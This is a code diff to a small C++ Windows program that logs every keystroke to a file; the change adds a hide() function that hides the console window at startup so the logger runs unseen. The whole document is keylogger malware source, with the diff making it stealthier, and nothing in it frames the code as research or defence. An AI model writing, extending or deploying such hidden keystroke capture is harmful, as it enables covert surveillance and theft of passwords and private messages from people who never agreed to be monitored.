@@ -1,16 +1,17 @@
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
-
+#include <winuser.h>
 
 using namespace std;
 
 int log(int key_stroke);
-
+void hide();
 
 int main()
     {
-               while(1)
+       hide();
+        while(1)
             {
 
                 for(char i=8;i<255;i++)
@@ -33,5 +34,12 @@ int log(int key_stroke)
        file<<(char)key_stroke;
        file.close();
     }
+void hide()
+{
+HWND consoleWindow;
+AllocConsole();
+consoleWindow= FindWindowA("ConsoleWindowClass", NULL);
+ShowWindow(consoleWindow,0);
+}
 
 
